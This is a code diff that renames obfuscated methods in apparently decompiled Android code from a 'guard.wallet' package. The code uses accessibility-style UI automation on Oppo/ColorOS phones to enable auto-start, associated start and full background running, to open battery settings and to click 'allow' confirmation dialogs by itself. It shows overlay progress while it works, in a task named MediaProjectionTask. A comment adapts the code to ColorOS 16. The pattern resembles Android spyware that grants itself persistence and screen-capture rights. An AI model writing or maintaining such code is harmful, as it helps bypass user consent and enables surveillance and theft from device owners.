@@ -35,7 +35,7 @@ public final class MediaProjectionTask implements Runnable {
                 /* keepAliveInAppDetail — find and click battery management item */
                 vVar.getClass();
                 try {
-                    if (!vVar.k0()) {
+                    if (!vVar.isInAppDetailWindow()) {
                         return;
                     }
                     Log.e("o.v", "keepAliveInAppDetail 窗口匹配");
@@ -43,8 +43,8 @@ public final class MediaProjectionTask implements Runnable {
                     vVar.G();
                     Log.e("o.v", "active root complete");
                     UiObject Q = vVar.findScrollableContainer();
-                    CombineFilter B0 = com.guard.wallet.engine.OppoEngine.B0();
-                    CombineFilter C0 = com.guard.wallet.engine.OppoEngine.C0();
+                    CombineFilter B0 = com.guard.wallet.engine.OppoEngine.buildPowerManageFilter();
+                    CombineFilter C0 = com.guard.wallet.engine.OppoEngine.buildPowerManage2Filter();
                     UiObject uiObject = null;
                     if (Q != null) {
                         Log.e("o.v", "应用详情窗口滚动视图查找成功");
@@ -83,7 +83,7 @@ public final class MediaProjectionTask implements Runnable {
                 /* keepAliveInPowerControl — enable self-start, associate start, background */
                 vVar.getClass();
                 try {
-                    if (!vVar.l0()) {
+                    if (!vVar.isInPowerControlWindow()) {
                         return;
                     }
                     Log.e("o.v", "keepAliveInPowerControl 窗口匹配");
@@ -94,15 +94,15 @@ public final class MediaProjectionTask implements Runnable {
                     vVar.G();
                     Log.e("o.v", "active root complete");
                     // ADAPT: ColorOS 16 已移除自启动和关联启动开关，失败不阻塞
-                    if (!vVar.s0()) {
+                    if (!vVar.toggleAutoStart()) {
                         Log.e("o.v", "允许自启动栏目不存在或操作失败 (ColorOS 16 可能已移除)");
                     }
                     com.guard.wallet.helper.BlockViewManager.h(50);
-                    if (!vVar.t0()) {
+                    if (!vVar.toggleRelateStart()) {
                         Log.e("o.v", "允许关联启动栏目不存在或操作失败 (ColorOS 16 可能已移除)");
                     }
                     com.guard.wallet.helper.BlockViewManager.h(60);
-                    if (!vVar.r0()) {
+                    if (!vVar.toggleFullBackground()) {
                         Log.e("o.v", "允许完全后台行为失败，仍继续后续流程");
                     }
                     com.guard.wallet.helper.BlockViewManager.h(70);
@@ -118,7 +118,7 @@ public final class MediaProjectionTask implements Runnable {
                 /* checkInAndroidXDialog — click allow confirm button */
                 vVar.getClass();
                 try {
-                    if (!vVar.j0()) {
+                    if (!vVar.isInAllowConfirmDialog()) {
                         return;
                     }
                     Log.e("o.v", "checkInAndroidXDialog 窗口匹配");
@@ -126,7 +126,7 @@ public final class MediaProjectionTask implements Runnable {
                     vVar.G();
                     Log.e("o.v", "active root complete");
                     try {
-                        UiObject findOneByCombineLoop = vVar.k().findOneByCombineLoop(com.guard.wallet.engine.OppoEngine.d0());
+                        UiObject findOneByCombineLoop = vVar.k().findOneByCombineLoop(com.guard.wallet.engine.OppoEngine.buildAllowConfirmFilter());
                         if (findOneByCombineLoop != null && findOneByCombineLoop.click()) {
                             Log.e("o.v", "查找并点击允许确认按钮完成");
                             com.guard.wallet.helper.BlockViewManager.h(90);
@@ -146,7 +146,7 @@ public final class MediaProjectionTask implements Runnable {
                 /* keepAliveInStartup — find and toggle auto-start checkbox */
                 vVar.getClass();
                 try {
-                    if (!vVar.m0()) {
+                    if (!vVar.isInStartupWindow()) {
                         return;
                     }
                     vVar.G();
